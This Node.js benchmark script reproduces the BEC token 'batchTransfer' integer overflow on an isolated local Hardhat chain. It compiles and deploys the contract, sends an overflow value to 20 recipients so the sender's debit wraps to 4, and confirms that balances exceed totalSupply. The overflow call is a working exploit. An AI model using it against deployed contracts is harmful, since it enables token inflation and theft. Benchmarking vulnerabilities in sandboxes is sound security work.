'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASE_ID = '05-BECToken';
const SOURCE_FILE = 'BECToken.sol';
const COMPILER_RELEASE = '0.4.16';
const RECIPIENT_COUNT = 20n;
const UINT256_MODULUS = 2n ** 256n;
const UINT256_MAX = UINT256_MODULUS - 1n;
const OVERFLOW_VALUE = (UINT256_MODULUS + RECIPIENT_COUNT - 1n) / RECIPIENT_COUNT;
const WRAPPED_DEBIT = (OVERFLOW_VALUE * RECIPIENT_COUNT) & UINT256_MAX;

function digest(value) {
  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
}

function compile(source) {
  const input = {
    language: 'Solidity',
    sources: { [SOURCE_FILE]: { content: source } },
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((row) => row.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((row) => row.formattedMessage).join('\n')}`);
  const artifact = output.contracts?.[SOURCE_FILE]?.BecToken;
  if (!artifact?.abi || !artifact?.evm?.bytecode?.object) throw new Error('benchmark_token_artifact_missing');
  return artifact;
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  if (caseId !== CASE_ID || path.basename(sourcePath) !== SOURCE_FILE) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const reportedRelease = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  const compilerVersion = String(solc.version());
  if (reportedRelease !== COMPILER_RELEASE || compilerVersion.split('+', 1)[0] !== COMPILER_RELEASE) {
    throw new Error(`benchmark_requires_exact_solc_${COMPILER_RELEASE}`);
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_chain_id_mismatch');
  const compilerArtifact = compile(source);
  const deployer = await provider.getSigner(0);
  const deployerAddress = await deployer.getAddress();
  const deployment = await new ContractFactory(
    compilerArtifact.abi, compilerArtifact.evm.bytecode.object, deployer,
  ).deploy();
  const deploymentReceipt = await deployment.deploymentTransaction().wait();
  if (deploymentReceipt.status !== 1) throw new Error('token_deployment_failed');
  await deployment.waitForDeployment();

  const initialSupply = await deployment.getFunction('totalSupply')();
  const ownerBalanceBefore = await deployment.getFunction('balanceOf')(deployerAddress);
  const hardhatAccounts = await provider.send('eth_accounts', []);
  const recipientAddresses = hardhatAccounts.slice(1, 20);
  if (recipientAddresses.length !== 19) throw new Error('expected_nineteen_local_recipient_accounts');
  recipientAddresses.push('0x00000000000000000000000000000000000000a5');
  if (new Set(recipientAddresses.map((address) => address.toLowerCase())).size !== Number(RECIPIENT_COUNT)) {
    throw new Error('duplicate_recipient_address');
  }
  const batchReceipt = await (await deployment.getFunction('batchTransfer')(
    recipientAddresses, OVERFLOW_VALUE,
    { gasLimit: 4_000_000 },
  )).wait();
  if (batchReceipt.status !== 1) throw new Error('overflow_batch_transfer_reverted');

  const receiverBalances = await Promise.all(
    recipientAddresses.map((address) => deployment.getFunction('balanceOf')(address)),
  );
  const ownerBalanceAfterBatch = await deployment.getFunction('balanceOf')(deployerAddress);
  const supplyAfterBatch = await deployment.getFunction('totalSupply')();
  const receiverBalanceSum = receiverBalances.reduce((sum, balance) => sum + balance, 0n);
  const aggregateAfterBatch = receiverBalanceSum + ownerBalanceAfterBatch;
  const firstRecipient = await provider.getSigner(1);
  const secondRecipient = await provider.getSigner(2);
  const firstAddress = (await firstRecipient.getAddress()).toLowerCase();
  const secondAddress = (await secondRecipient.getAddress()).toLowerCase();
  const firstBalanceBeforeTransfer = await deployment.getFunction('balanceOf')(firstAddress);
  const secondBalanceBeforeTransfer = await deployment.getFunction('balanceOf')(secondAddress);
  const transferAmount = 1n;
  const transferReceipt = await (await deployment.connect(firstRecipient)
    .getFunction('transfer')(secondAddress, transferAmount)).wait();
  const firstBalanceAfterTransfer = await deployment.getFunction('balanceOf')(firstAddress);
  const secondBalanceAfterTransfer = await deployment.getFunction('balanceOf')(secondAddress);
  const aggregateAfterTransfer = firstBalanceAfterTransfer + secondBalanceAfterTransfer
    + receiverBalances.slice(2).reduce((sum, balance) => sum + balance, 0n)
    + ownerBalanceAfterBatch;
  const confirmed = initialSupply === 7_000_000_000n * 10n ** 18n
    && ownerBalanceBefore === initialSupply
    && OVERFLOW_VALUE * RECIPIENT_COUNT > UINT256_MAX
    && WRAPPED_DEBIT === 4n
    && batchReceipt.status === 1
    && receiverBalances.length === Number(RECIPIENT_COUNT)
    && receiverBalances.every((balance) => balance === OVERFLOW_VALUE)
    && ownerBalanceAfterBatch === initialSupply - WRAPPED_DEBIT
    && supplyAfterBatch === initialSupply
    && aggregateAfterBatch === initialSupply + UINT256_MODULUS
    && aggregateAfterBatch > supplyAfterBatch
    && transferReceipt.status === 1
    && firstBalanceBeforeTransfer === OVERFLOW_VALUE
    && secondBalanceBeforeTransfer === OVERFLOW_VALUE
    && firstBalanceAfterTransfer === OVERFLOW_VALUE - transferAmount
    && secondBalanceAfterTransfer === OVERFLOW_VALUE + transferAmount
    && aggregateAfterTransfer === aggregateAfterBatch;
  const result = {
    schemaVersion: 1,
    caseId: CASE_ID,
    state: confirmed ? 'passed' : 'failed',
    confirmedVulnerability: confirmed,
    proofScope: 'token_supply_invariant_violation_and_transferability',
    vulnerability: 'arithmetic',
    mode: 'isolated_in_process',
    compilerVersion,
    compilerArtifactSha256: compilerArtifactSha256.startsWith('0x')
      ? compilerArtifactSha256 : `0x${compilerArtifactSha256}`,
    compilerKind: 'solc-js-original-source',
    sourceSha256,
    targetAddress: await deployment.getAddress(),
    deployer: deployerAddress,
    recipientCount: recipientAddresses.length,
    overflowValue: OVERFLOW_VALUE.toString(),
    mathematicalBatchAmount: (OVERFLOW_VALUE * RECIPIENT_COUNT).toString(),
    wrappedDebit: WRAPPED_DEBIT.toString(),
    initialSupply: initialSupply.toString(),
    ownerBalanceAfterBatch: ownerBalanceAfterBatch.toString(),
    recipientBalanceSum: receiverBalanceSum.toString(),
    aggregateBalancesAfterBatch: aggregateAfterBatch.toString(),
    supplyAfterBatch: supplyAfterBatch.toString(),
    firstRecipient: firstAddress,
    secondRecipient: secondAddress,
    transferAmount: transferAmount.toString(),
    firstBalanceAfterTransfer: firstBalanceAfterTransfer.toString(),
    secondBalanceAfterTransfer: secondBalanceAfterTransfer.toString(),
    aggregateAfterTransfer: aggregateAfterTransfer.toString(),
    transactionHashes: [deploymentReceipt.hash, batchReceipt.hash, transferReceipt.hash],
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'overflow_or_transferable_balance_assertion_failed',
    reproduction: '持有初始供应量的普通账户向 20 个地址批量转账，令 uint256(cnt * value) 回绕为 4；每个接收者仍获得 value。随后接收者将 token 实际转给另一账户，并验证总账户余额超过 totalSupply 且不变量无法恢复。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
